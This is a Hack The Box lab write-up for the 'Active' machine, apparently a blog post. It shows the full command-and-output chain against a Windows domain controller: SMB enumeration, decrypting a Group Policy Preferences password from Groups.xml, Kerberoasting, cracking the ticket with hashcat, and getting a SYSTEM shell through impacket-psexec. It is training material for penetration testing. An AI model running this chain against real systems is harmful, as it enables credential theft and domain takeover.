---
title: HTB Write Up - Active
date: 2023-12-20 12:00:00
categories: [Pentest, HTB]
tags: [HTB]
---
## Target #VM3 - 10.10.10.100

### Service Enumeration

**Port Scan Results**

Server IP Address | Ports Open
------------------|----------------------------------------
10.10.10.100      | **TCP**: 53,88,135,139,389,445,464,593,636,3268,3269,49152,49153,49154,49155,49157,49158,49165


```shell
PORT      STATE SERVICE
53/tcp    open  domain
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  http-rpc-epmap
636/tcp   open  ldapssl
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
49152/tcp open  unknown
49153/tcp open  unknown
49154/tcp open  unknown
49155/tcp open  unknown
49157/tcp open  unknown
49158/tcp open  unknown
49165/tcp open  unknown
```

**DNS Enumeration**
```shell
$ dig version.bind CHAOS TXT @10.10.10.100

;; ANSWER SECTION:
version.bind.           1476526080 IN   TXT     "Microsoft DNS 6.1.7601 (1DB15D39)"

$ sudo nmap -Pn --script *dns* 10.10.10.100
Starting Nmap 7.94SVN ( https://nmap.org ) at 2023-12-16 09:43 CST
Pre-scan script results:
| broadcast-dns-service-discovery:
|   224.0.0.251
|     49153/tcp rdlink
|       rpBA=62:22:F5:96:8C:47
|       rpVr=360.4
|       rpAD=754b89e286c3
|       model=D111AP
|       Address=192.168.1.108 fe80::1c4b:ab3c:893e:84d5
|     54722/tcp rdlink
|       rpBA=82:99:03:7C:AB:6C
|       rpVr=440.9
|       rpAD=4abd34f9338e
|       model=D201AP
|_      Address=192.168.1.115 fe80::18dc:8a88:fa27:21dd
Nmap scan report for 10.10.10.100
Host is up (0.26s latency).
Not shown: 982 closed tcp ports (reset)
PORT      STATE SERVICE
53/tcp    open  domain
|_dns-fuzz: Server didn't response to our probe, can't fuzz
|_dns-nsec3-enum: Can't determine domain for host 10.10.10.100; use dns-nsec3-enum.domains script arg.
|_dns-nsec-enum: Can't determine domain for host 10.10.10.100; use dns-nsec-enum.domains script arg.
| dns-nsid:
|_  bind.version: Microsoft DNS 6.1.7601 (1DB15D39)
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  http-rpc-epmap
636/tcp   open  ldapssl
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
49152/tcp open  unknown
49153/tcp open  unknown
49154/tcp open  unknown
49155/tcp open  unknown
49157/tcp open  unknown
49158/tcp open  unknown
49165/tcp open  unknown

Host script results:
|_dns-brute: Can't guess domain of "10.10.10.100"; use dns-brute.domain script argument.
|_fcrdns: FAIL (No PTR record)
| dns-blacklist:
|   SPAM
|_    l2.apews.org - FAIL

Nmap done: 1 IP address (1 host up) scanned in 572.63 seconds
```

**Kerberos & LDAP Enumeration**
```shell
$ sudo nmap -Pn  -sV --script "ldap* and not brute" 10.10.10.100
Starting Nmap 7.94SVN ( https://nmap.org ) at 2023-12-16 09:48 CST
Nmap scan report for 10.10.10.100
Host is up (0.26s latency).
Not shown: 982 closed tcp ports (reset)
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Microsoft DNS 6.1.7601 (1DB15D39) (Windows Server 2008 R2 SP1)
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2023-12-16 01:59:36Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: active.htb, Site: Default-First-Site-Name)
| ldap-rootdse:
| LDAP Results
|   <ROOT>
|       currentTime: 20231216020034.0Z
|       subschemaSubentry: CN=Aggregate,CN=Schema,CN=Configuration,DC=active,DC=htb
|       dsServiceName: CN=NTDS Settings,CN=DC,CN=Servers,CN=Default-First-Site-Name,CN=Sites,CN=Configuration,DC=active,DC=htb
|       namingContexts: DC=active,DC=htb
|       namingContexts: CN=Configuration,DC=active,DC=htb
|       namingContexts: CN=Schema,CN=Configuration,DC=active,DC=htb
|       namingContexts: DC=DomainDnsZones,DC=active,DC=htb
|       namingContexts: DC=ForestDnsZones,DC=active,DC=htb
|       defaultNamingContext: DC=active,DC=htb
|       schemaNamingContext: CN=Schema,CN=Configuration,DC=active,DC=htb
|       configurationNamingContext: CN=Configuration,DC=active,DC=htb
|       rootDomainNamingContext: DC=active,DC=htb
|       supportedControl: 1.2.840.113556.1.4.319
|       supportedControl: 1.2.840.113556.1.4.801
|       supportedControl: 1.2.840.113556.1.4.473
|       supportedControl: 1.2.840.113556.1.4.528
|       supportedControl: 1.2.840.113556.1.4.417
|       supportedControl: 1.2.840.113556.1.4.619
|       supportedControl: 1.2.840.113556.1.4.841
|       supportedControl: 1.2.840.113556.1.4.529
|       supportedControl: 1.2.840.113556.1.4.805
|       supportedControl: 1.2.840.113556.1.4.521
|       supportedControl: 1.2.840.113556.1.4.970
|       supportedControl: 1.2.840.113556.1.4.1338
|       supportedControl: 1.2.840.113556.1.4.474
|       supportedControl: 1.2.840.113556.1.4.1339
|       supportedControl: 1.2.840.113556.1.4.1340
|       supportedControl: 1.2.840.113556.1.4.1413
|       supportedControl: 2.16.840.1.113730.3.4.9
|       supportedControl: 2.16.840.1.113730.3.4.10
|       supportedControl: 1.2.840.113556.1.4.1504
|       supportedControl: 1.2.840.113556.1.4.1852
|       supportedControl: 1.2.840.113556.1.4.802
|       supportedControl: 1.2.840.113556.1.4.1907
|       supportedControl: 1.2.840.113556.1.4.1948
|       supportedControl: 1.2.840.113556.1.4.1974
|       supportedControl: 1.2.840.113556.1.4.1341
|       supportedControl: 1.2.840.113556.1.4.2026
|       supportedControl: 1.2.840.113556.1.4.2064
|       supportedControl: 1.2.840.113556.1.4.2065
|       supportedControl: 1.2.840.113556.1.4.2066
|       supportedLDAPVersion: 3
|       supportedLDAPVersion: 2
|       supportedLDAPPolicies: MaxPoolThreads
|       supportedLDAPPolicies: MaxDatagramRecv
|       supportedLDAPPolicies: MaxReceiveBuffer
|       supportedLDAPPolicies: InitRecvTimeout
|       supportedLDAPPolicies: MaxConnections
|       supportedLDAPPolicies: MaxConnIdleTime
|       supportedLDAPPolicies: MaxPageSize
|       supportedLDAPPolicies: MaxQueryDuration
|       supportedLDAPPolicies: MaxTempTableSize
|       supportedLDAPPolicies: MaxResultSetSize
|       supportedLDAPPolicies: MinResultSets
|       supportedLDAPPolicies: MaxResultSetsPerConn
|       supportedLDAPPolicies: MaxNotificationPerConn
|       supportedLDAPPolicies: MaxValRange
|       supportedLDAPPolicies: ThreadMemoryLimit
|       supportedLDAPPolicies: SystemMemoryLimitPercent
|       highestCommittedUSN: 114797
|       supportedSASLMechanisms: GSSAPI
|       supportedSASLMechanisms: GSS-SPNEGO
|       supportedSASLMechanisms: EXTERNAL
|       supportedSASLMechanisms: DIGEST-MD5
|       dnsHostName: DC.active.htb
|       ldapServiceName: active.htb:dc$@ACTIVE.HTB
|       serverName: CN=DC,CN=Servers,CN=Default-First-Site-Name,CN=Sites,CN=Configuration,DC=active,DC=htb
|       supportedCapabilities: 1.2.840.113556.1.4.800
|       supportedCapabilities: 1.2.840.113556.1.4.1670
|       supportedCapabilities: 1.2.840.113556.1.4.1791
|       supportedCapabilities: 1.2.840.113556.1.4.1935
|       supportedCapabilities: 1.2.840.113556.1.4.2080
|       isSynchronized: TRUE
|       isGlobalCatalogReady: TRUE
|       domainFunctionality: 4
|       forestFunctionality: 4
|_      domainControllerFunctionality: 4
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: active.htb, Site: Default-First-Site-Name)
| ldap-rootdse:
| LDAP Results
|   <ROOT>
|       currentTime: 20231216020034.0Z
|       subschemaSubentry: CN=Aggregate,CN=Schema,CN=Configuration,DC=active,DC=htb
|       dsServiceName: CN=NTDS Settings,CN=DC,CN=Servers,CN=Default-First-Site-Name,CN=Sites,CN=Configuration,DC=active,DC=htb
|       namingContexts: DC=active,DC=htb
|       namingContexts: CN=Configuration,DC=active,DC=htb
|       namingContexts: CN=Schema,CN=Configuration,DC=active,DC=htb
|       namingContexts: DC=DomainDnsZones,DC=active,DC=htb
|       namingContexts: DC=ForestDnsZones,DC=active,DC=htb
|       defaultNamingContext: DC=active,DC=htb
|       schemaNamingContext: CN=Schema,CN=Configuration,DC=active,DC=htb
|       configurationNamingContext: CN=Configuration,DC=active,DC=htb
|       rootDomainNamingContext: DC=active,DC=htb
|       supportedControl: 1.2.840.113556.1.4.319
|       supportedControl: 1.2.840.113556.1.4.801
|       supportedControl: 1.2.840.113556.1.4.473
|       supportedControl: 1.2.840.113556.1.4.528
|       supportedControl: 1.2.840.113556.1.4.417
|       supportedControl: 1.2.840.113556.1.4.619
|       supportedControl: 1.2.840.113556.1.4.841
|       supportedControl: 1.2.840.113556.1.4.529
|       supportedControl: 1.2.840.113556.1.4.805
|       supportedControl: 1.2.840.113556.1.4.521
|       supportedControl: 1.2.840.113556.1.4.970
|       supportedControl: 1.2.840.113556.1.4.1338
|       supportedControl: 1.2.840.113556.1.4.474
|       supportedControl: 1.2.840.113556.1.4.1339
|       supportedControl: 1.2.840.113556.1.4.1340
|       supportedControl: 1.2.840.113556.1.4.1413
|       supportedControl: 2.16.840.1.113730.3.4.9
|       supportedControl: 2.16.840.1.113730.3.4.10
|       supportedControl: 1.2.840.113556.1.4.1504
|       supportedControl: 1.2.840.113556.1.4.1852
|       supportedControl: 1.2.840.113556.1.4.802
|       supportedControl: 1.2.840.113556.1.4.1907
|       supportedControl: 1.2.840.113556.1.4.1948
|       supportedControl: 1.2.840.113556.1.4.1974
|       supportedControl: 1.2.840.113556.1.4.1341
|       supportedControl: 1.2.840.113556.1.4.2026
|       supportedControl: 1.2.840.113556.1.4.2064
|       supportedControl: 1.2.840.113556.1.4.2065
|       supportedControl: 1.2.840.113556.1.4.2066
|       supportedLDAPVersion: 3
|       supportedLDAPVersion: 2
|       supportedLDAPPolicies: MaxPoolThreads
|       supportedLDAPPolicies: MaxDatagramRecv
|       supportedLDAPPolicies: MaxReceiveBuffer
|       supportedLDAPPolicies: InitRecvTimeout
|       supportedLDAPPolicies: MaxConnections
|       supportedLDAPPolicies: MaxConnIdleTime
|       supportedLDAPPolicies: MaxPageSize
|       supportedLDAPPolicies: MaxQueryDuration
|       supportedLDAPPolicies: MaxTempTableSize
|       supportedLDAPPolicies: MaxResultSetSize
|       supportedLDAPPolicies: MinResultSets
|       supportedLDAPPolicies: MaxResultSetsPerConn
|       supportedLDAPPolicies: MaxNotificationPerConn
|       supportedLDAPPolicies: MaxValRange
|       supportedLDAPPolicies: ThreadMemoryLimit
|       supportedLDAPPolicies: SystemMemoryLimitPercent
|       highestCommittedUSN: 114797
|       supportedSASLMechanisms: GSSAPI
|       supportedSASLMechanisms: GSS-SPNEGO
|       supportedSASLMechanisms: EXTERNAL
|       supportedSASLMechanisms: DIGEST-MD5
|       dnsHostName: DC.active.htb
|       ldapServiceName: active.htb:dc$@ACTIVE.HTB
|       serverName: CN=DC,CN=Servers,CN=Default-First-Site-Name,CN=Sites,CN=Configuration,DC=active,DC=htb
|       supportedCapabilities: 1.2.840.113556.1.4.800
|       supportedCapabilities: 1.2.840.113556.1.4.1670
|       supportedCapabilities: 1.2.840.113556.1.4.1791
|       supportedCapabilities: 1.2.840.113556.1.4.1935
|       supportedCapabilities: 1.2.840.113556.1.4.2080
|       isSynchronized: TRUE
|       isGlobalCatalogReady: TRUE
|       domainFunctionality: 4
|       forestFunctionality: 4
|_      domainControllerFunctionality: 4
3269/tcp  open  tcpwrapped
49152/tcp open  msrpc         Microsoft Windows RPC
49153/tcp open  msrpc         Microsoft Windows RPC
49154/tcp open  msrpc         Microsoft Windows RPC
49155/tcp open  msrpc         Microsoft Windows RPC
49157/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49158/tcp open  msrpc         Microsoft Windows RPC
49165/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: DC; OSs: Windows, Windows 2008 R2; CPE: cpe:/o:microsoft:windows_server_2008:r2:sp1, cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 701.44 seconds
```

**SMB Enumeration**

```shell
//enum4linux
do_connect: Connection to 10.10.10.100 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
        NETLOGON        Disk      Logon server share
        Replication     Disk
        SYSVOL          Disk      Logon server share
        Users           Disk
Reconnecting with SMB1 for workgroup listing.
Unable to connect with SMB1 -- no workgroup available

[+] Attempting to map shares on 10.10.10.100

//10.10.10.100/ADMIN$   Mapping: DENIED Listing: N/A Writing: N/A
//10.10.10.100/C$       Mapping: DENIED Listing: N/A Writing: N/A
//10.10.10.100/IPC$     Mapping: OK Listing: DENIED Writing: N/A
//10.10.10.100/NETLOGON Mapping: DENIED Listing: N/A Writing: N/A
//10.10.10.100/Replication      Mapping: OK Listing: OK Writing: N/A
//10.10.10.100/SYSVOL   Mapping: DENIED Listing: N/A Writing: N/A
//10.10.10.100/Users    Mapping: DENIED Listing: N/A Writing: N/A
```
### Initial Access - Exposure of Credentials on an SMB Shared Folder

**Vulnerability Explanation:** Share SYSVOL on SMB Service leading to login credential leakage.

```shell
smb: \> cd active.htb
smb: \active.htb\> dir
  .                                   D        0  Sat Jul 21 18:37:44 2018
  ..                                  D        0  Sat Jul 21 18:37:44 2018
  DfsrPrivate                       DHS        0  Sat Jul 21 18:37:44 2018
  Policies                            D        0  Sat Jul 21 18:37:44 2018
  scripts                             D        0  Thu Jul 19 02:48:57 2018


smb: \> cd active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE
smb: \active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\> dir
  .                                   D        0  Sat Jul 21 18:37:44 2018
  ..                                  D        0  Sat Jul 21 18:37:44 2018
  Microsoft                           D        0  Sat Jul 21 18:37:44 2018
  Preferences                         D        0  Sat Jul 21 18:37:44 2018
  Registry.pol                        A     2788  Thu Jul 19 02:53:45 2018

                5217023 blocks of size 4096. 277502 blocks available
smb: \active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\> Get-ChildItem
Get-ChildItem: command not found
smb: \active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\> cd Preferences
smb: \active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Preferences\> dir
  .                                   D        0  Sat Jul 21 18:37:44 2018
  ..                                  D        0  Sat Jul 21 18:37:44 2018
  Groups                              D        0  Sat Jul 21 18:37:44 2018

smb: \active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Preferences\> cd Groups
smb: \active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Preferences\Groups\> dir
  .                                   D        0  Sat Jul 21 18:37:44 2018
  ..                                  D        0  Sat Jul 21 18:37:44 2018
  Groups.xml                          A      533  Thu Jul 19 04:46:06 2018
```

In the SMB folder of active.htb, there exists a directory named Replication, seemingly serving as a backup of SYSVOL. Further information regarding security issues related to SYSVOL and Group Policy Preferences (GPP) can be found in this document: https://adsecurity.org/?p=2288. In a nutshell, SYSVOL is a domain-wide share accessible to all users, containing vital data like logon scripts and group policy information, synchronized across all Domain Controllers.
After all, we obtain the file, Group.xml, and extrack the password out of it. We can repeatedly test it for logon.

**POC:** 

```xml
$ cat Groups.xml
<?xml version="1.0" encoding="utf-8"?>
<Groups clsid="{3125E937-EB16-4b4c-9934-544FC6D24D26}"><User clsid="{DF5F1855-51E5-4d24-8B1A-D9BDE98BA1D1}" name="active.htb\SVC_TGS" image="2" changed="2018-07-18 20:46:06" uid="{EF57DA28-5F69-4530-A59E-AAB58578219D}"><Properties action="U" newName="" fullName="" description="" cpassword="edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ" changeLogon="0" noChange="1" neverExpires="1" acctDisabled="0" userName="active.htb\SVC_TGS"/></User>
</Groups>

$ gpp-decrypt edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ
GPPstillStandingStrong2k18

$ enum4linux -u active.htb\\SVC_TGS -p GPPstillStandingStrong2k18 10.10.10.100 
===================================( Session Check on 10.10.10.100 )===================================
[+] Server 10.10.10.100 allows sessions using username 'active.htb\SVC_TGS', password 'GPPstillStandingStrong2k18'
================================( Getting domain SID for 10.10.10.100 )================================
Domain Name: ACTIVE
Domain Sid: S-1-5-21-405608879-3187717380-1996298813
[+] Host is part of a domain (not a workgroup)

$ impacket-psexec 'active.htb/SVC_TGS:GPPstillStandingStrong2k18@10.10.10.100'
Impacket v0.11.0 - Copyright 2023 Fortra
[*] Requesting shares on 10.10.10.100.....
[-] share 'ADMIN$' is not writable.
[-] share 'C$' is not writable.
[-] share 'NETLOGON' is not writable.
[-] share 'Replication' is not writable.
[-] share 'SYSVOL' is not writable.
[-] share 'Users' is not writable.
```



**Proof Screenshot:**

![Img](/assets/img/htb/active/init_access_fail.png)

![Img](/assets/img/htb/active/init_access_smb.png)

![Img](/assets/img/htb/active/init_access.png)


### Privilege Escalation - Kerberoasting

**Vulnerability Explanation:** Attacker using obtained TGS credential to authenticate with DC, and request specific SPN service ticket(TGTs), which can be offline cracking via dictionary.

![Img](/assets/img/htb/active/Kerberoasting_explain.png)

**POC:** Kerberoasting using impacket-GetUserSPNs, and fortunately we get Administrator credential. Normally we shoud get windows service like MSSQL, something like that. 

```shell
$ impacket-GetUserSPNs -request -dc-ip 10.10.10.100 active.htb/SVC_TGS:GPPstillStandingStrong2k18
Impacket v0.11.0 - Copyright 2023 Fortra

ServicePrincipalName  Name           MemberOf                                                  PasswordLastSet             LastLogon                   Delegation
--------------------  -------------  --------------------------------------------------------  --------------------------  --------------------------  ----------
active/CIFS:445       Administrator  CN=Group Policy Creator Owners,CN=Users,DC=active,DC=htb  2018-07-19 03:06:40.351723  2023-12-17 10:06:39.832150

[-] CCache file is not found. Skipping...
$krb5tgs$23$*Administrator$ACTIVE.HTB$active.htb/Administrator*$e7b361f4a546cb5a7eb73f6ea35a6a97$e499c348cf54f542378a2ce6754063e4bc4bdcb345691e218309308a5bff029525cd7719a36dde5343aedab1f8e466fabfa686ac77583527d4cc87bd8cd967368b200c5eecb427bf50f4143004e3dbd58e01017d1f660e98e9e3311ecd6fdaeb658f27d9abae764f85b6c9753785fc143b37ff8fe2609eb9f656c601ace3e29493f674d44e2bdc686a060f58a599841be1bdc213f162ddd8439c1b4f00670508882ac220c95cccbc18aca3d4625d284ef136a7d76b3cb99eb8c5287b8ab6faf8e46cc8bec01d53b9af552f63c7330a8135fdb18201565c8c62996ef12dfe34cc2c3dafc7e9349956ae1db127b9ef95bb9cbac8e3ecd6bee8b2d7c1ae5aacb1ea2e538adade9663b81ea72f6b852686c7d552a4ff387784edfc59be41eb314f2be009d2de416e88867f61445649092cd31f18bcaed5307051edacce969b9c5c1a8dffe75d9d193616331dc60a4cdb0e23f8cb4ffadcbc7f9c4a0b272b10eb5be4c88e15677621c3bc159b8892a5e5feba66460e5f5dcd4ac870c8cd29eb0860e5bffc54c62ca3f16ec9d3b8936bfa6665849ac8bd641cae1d9ba0b8c94c10c5112e30053f17509d4686001158116c0f9820d45b14dc0342dd50ef37e322f6646a748634b0dd50512296dd9545a5d4e33c7b9d1971f44e6776e255c94d4cbb312feae10eeed95d3a4c0b1c90fb1beaea36fb7c6efc7d4c129aadef3c442f272c906803f4e5ca1a701cca8e994d4c75c44c6fdc5298f7f7315893fcb1e0a7617050aade31a0b0686f96b4a86f2359c5d5619d60935da211931d66ae43b8c88fb86c1d6854bcda64219d6d850b2b6aa24ef2662a4dc100f7452010f747a507c6b1fd651ce9ed91c981850a9ffc701cd7cd5992c5b5649cee3b6626e9378e73056718cc30023ef6f217662c8dcb5950469e94370f5c629711199905553307bf99991445658d76ab9e09dbd90cf828dd130ea1f50f3498eae59f6bf0eebbcd9499f8f3ff00c90cfcb2391473cb320fc4be2a641e702c1f7e3b72252a3c439c0786684a4a091e75e7fab14cbee15c7ed075c26adb6fcc8b276814e08be0029eb1a238de3b6b7eba729f4f73d200caede0332bf98f09e1dbde8e9b7716bba69cbcc8558027209734e62055d24e8be499dfa6318020bc1a78dec918a5e560a91951946041b23b4bd5a64278419b4d2bcd15c0730b84488c25a649a66f834273ee3a65862752a59cbf08fc878b669fd0679cbc31f63f9a46711087f02fcb84

$ hashcat -m 13100 active/kerberoasting_result.txt /usr/share/wordlists/rockyou.txt --show
$krb5tgs$23$*Administrator$ACTIVE.HTB$active.htb/Administrator*$0fcd5e972b348dd398e6ba4ffffd62c5$e37f3782ae70975e028da316f20e1337c26d2024541de12dc5d4a87dac9110478d1cfdee2927038a407a230593bf99587f35fbb576345bf525377ca28c121cfcac665ef9aaeed71fc021146e52fe55c8164977630b3d619c8fdc41a492739834a0b7f033592a49dc65ca7d1a5fbdc86e85f161b077230a6bda88504a2a8c23719e50133575604d52c45d5215c70ae592f4d44c2974ccfb20cedd86477f32623962cea9ec33c6d6ed700b76f5a040fd6a82c32dfa51f536dba0dbb2a7a6ac250a7ad5f56ddead26ccda6a1f4f9f5eec30aeea18d3af00a92477a42aed52a49992c0e2bc073a78cac318484f91518a012eb9b4a745db520b0882231d9d23df6a58f790b034d15b9408e93dc605d378f783fd0f0cf591925c1b183961137c6c43277a7b7149d680af78fd333726c1225fe93bf216eaf55fb3a9ac4bdcc13691f3cb9798ab2993408e8a42451b4c8995b342343c0f94e13683dee8d17d28c822da06a2ecb09cf552152fded95dc163fc7a7a83767c255f64e1a3dd495a8f42c202272882343bc98f98d94a25ed222dead5e0e91c50ab632397a8deaa1badcdef7d5e243bda9709300691643c82cd6d5a0771d1836fd34ea85f4ae765828424bad00645b5c66ea4baf520440de7a4ea4935e97a609a0fd27796632374c89b252bbc0912a8dfdecbf2fda182cc8a8537618935e3679a7d804a7a04ee159d6285b16d984e8653e7719dfce569ce22b101d2f029a16898029dfb3b73550e7c2a9f0c96f963aaaa959375d77cb5ef665b85945f290066c29425d3638264b8365eac875453b23d3ef1367220a2eea8f0537f73247628729a7a3ce9cd3d1e23f77807d32776c7aefe5676b68e6ea5a20d5165ba97462e4c8a94445236412e84fb6c9b219eb949dae91596f16c0910680831bb8904f88827191060e860baf1deaf8de267b3e2b757febbd1a02a865384d76257e5c7fd9c7b377558d5c57d1311b544fb322aec3d86c7ae109de65c8ff9ce45204cb52d2c252c878b2e5cd00e91e9a1827231b8f3f68a1ebc10e9a788801429ce5a804cbb338cccbb550adb246307dba193dcebcc000aab612e51f24a989f2512eb7ccdd49876cef8dd623b8eb9d929ee5e060cabc6ae000df1aae9e19b7f712000da2b33758167087a26f09bda873a52320fb67ff808d416a2dbbc96443863c854071ba4b3351b404a2f481a9a1eaa7114d9a90c259e5b6f33fba8dd13294942e7120e5787b357df9b54f21a89:Ticketmaster1968

$ impacket-psexec 'active.htb/Administrator:Ticketmaster1968@10.10.10.100'
Impacket v0.11.0 - Copyright 2023 Fortra
[*] Requesting shares on 10.10.10.100.....
[*] Found writable share ADMIN$
[*] Uploading file PIvaDqCZ.exe
[*] Opening SVCManager on 10.10.10.100.....
[*] Creating service RJZR on 10.10.10.100.....
[*] Starting service RJZR.....
[!] Press help for extra shell commands
Microsoft Windows [Version 6.1.7601]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\Windows\system32> whoami
nt authority\system
```

**System Proof Screenshot:**

![Img](/assets/img/htb/active/proof.png)
